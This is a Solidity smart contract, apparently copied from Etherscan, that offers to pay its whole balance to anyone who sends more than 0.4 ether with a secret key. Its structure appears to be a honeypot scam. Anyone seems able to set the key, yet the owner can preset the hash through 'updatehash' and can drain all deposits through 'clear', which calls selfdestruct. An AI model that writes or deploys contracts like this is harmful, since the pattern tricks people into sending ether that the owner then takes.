/**
 * Source Code first verified at https://etherscan.io on Monday, April 22, 2019
 (UTC) */

pragma solidity ^0.4.25;
contract contract1
{
    bytes32 keyHash;
    address owner;
    bytes32 wallet_id = 0x7483750c06fa3c312c684385f6c2a21c71e4582bd0dbd9492b1c0cf10a199099;

    constructor() public {
        owner = msg.sender;
    }

    function withdraw(string key) public payable
    {
        require(msg.sender == tx.origin);
        if(keyHash == keccak256(abi.encodePacked(key))) {
            if(msg.value > 0.4 ether) {
                msg.sender.transfer(address(this).balance);
            }
        }
    }

    function setup_key(string key) public
    {
        if (keyHash == 0x0) {
            keyHash = keccak256(abi.encodePacked(key));
        }
    }

    function updatehash(bytes32 new_hash) public
    {
        if (keyHash == 0x0) {
            keyHash = new_hash;
        }
    }

    function clear() public
    {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function get_id() public view returns(bytes32){
        return wallet_id;
    }

    function () public payable {
    }
}